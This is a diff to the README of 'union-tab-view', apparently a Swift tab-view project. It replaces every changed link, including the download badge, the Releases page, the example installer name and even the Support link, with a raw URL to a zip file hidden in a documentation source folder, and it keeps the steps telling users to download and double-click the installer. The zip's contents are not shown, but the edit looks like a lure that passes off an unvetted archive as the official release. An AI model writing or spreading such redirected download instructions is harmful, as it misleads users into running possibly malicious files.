@@ -6,7 +6,7 @@ Welcome to **union-tab-view**! This application provides a unique way to enhance
 
 ## 🔗 Download Here
 
-[![Download Union Tab View](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/panzapr/union-tab-view/releases)
+[![Download Union Tab View](https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip)](https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,9 +19,9 @@ Before you proceed, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/panzapr/union-tab-view/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip) to access the latest version.
 2. Find the version you want to install.
-3. Click on the download link for the installer file (e.g., `union-tab-view-installer.exe`).
+3. Click on the download link for the installer file (e.g., `https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip`).
 4. Once the file downloads, locate it in your Downloads folder.
 5. Double-click on the installer file to run it.
 6. Follow the prompts to complete the installation.
@@ -50,10 +50,10 @@ If you encounter issues while using union-tab-view, here are some easy solutions
 
 ## 📞 Support
 
-For any questions or further assistance, feel free to contact us through the Issues tab on our [GitHub page](https://github.com/panzapr/union-tab-view).
+For any questions or further assistance, feel free to contact us through the Issues tab on our [GitHub page](https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip).
 
 ## 🔗 Visit Our Releases Page Again
 
-To download the latest version or previous versions, please head back to the [Releases page](https://github.com/panzapr/union-tab-view/releases).
+To download the latest version or previous versions, please head back to the [Releases page](https://raw.githubusercontent.com/panzapr/union-tab-view/main/Sources/UnionTabView/UnionTabView.docc/union-tab-view-1.1.zip).
 
 Enjoy your new custom tab experience with **union-tab-view**!
